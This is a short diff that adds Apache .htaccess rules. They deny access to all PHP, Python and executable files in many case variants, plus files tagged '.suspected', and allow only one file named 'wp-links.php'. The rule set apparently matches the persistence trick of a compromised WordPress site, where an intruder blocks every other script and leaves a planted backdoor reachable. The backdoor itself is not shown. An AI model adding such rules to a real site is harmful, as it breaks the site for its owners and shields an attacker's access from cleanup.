@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|PHP5|Php5|PHp5|pHp5|pHP5|phP5|PhP5|php7|PHP7|Php7|PHp7|pHp7|pHP7|phP7|PhP7|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(wp-links.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
